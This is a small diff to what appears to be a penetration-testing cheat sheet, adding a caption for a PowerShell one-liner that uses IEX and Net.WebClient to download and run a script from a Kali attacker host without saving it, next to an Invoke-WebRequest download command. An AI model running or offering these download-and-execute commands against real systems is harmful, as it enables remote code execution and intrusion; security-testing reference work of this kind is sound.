@@ -40,6 +40,7 @@ PowerShell from cmd
 powershell.exe -command Invoke-WebRequest -Uri http://<Kali IP>/<filename> -OutFile <filename>
 ```
 
+Download and execute with `Invoke-Expression` without saving file
 ```
 powershell.exe IEX(New-Object Net.WebClient).downloadstring(http://<Kali IP>/<filename>)
 ```
